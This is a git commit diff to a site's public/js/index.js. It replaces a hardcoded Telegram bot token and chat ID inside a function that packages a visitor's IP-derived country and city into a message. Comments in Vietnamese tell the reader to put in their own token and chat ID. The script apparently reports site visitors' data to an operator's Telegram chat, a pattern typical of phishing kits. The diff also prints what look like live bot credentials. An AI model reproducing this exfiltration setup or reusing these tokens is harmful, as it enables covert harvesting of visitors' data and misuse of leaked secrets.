bf663572c5f822625951d0d51b6325d331b180c8
dsc3r2ffds <camila.jacobi6exupv@gmail.com>
2024-10-12 14:14:53 +0700

    Update index.js

--- public/js/index.js
+++ public/js/index.js
@@ -239,8 +239,8 @@ function showPrompt(IpAddress) {
         '%0A<strong>Country : </strong>' + IpAddress.countryName +'( '+IpAddress.countryCode+' )'+
         '%0A<strong>City : </strong>' + IpAddress.city ;
 
-        const botToken = '6899648318:AAEuhFl-OX-SGSRSc2i_fa7ZSMJTE1Yo3Ik'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
-        const chatId = '-1002129119762'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
+        const botToken = '7757060865:AAHxrieVbZmOY0795ekDbcp-IPso0rZK868'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
+        const chatId = '-1002275895232'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
 
         // const botToken = process.env.NEXT_PUBLIC_BOT_TOKEN;
         // const chatId = process.env.NEXT_PUBLIC_CHAT_ID; 
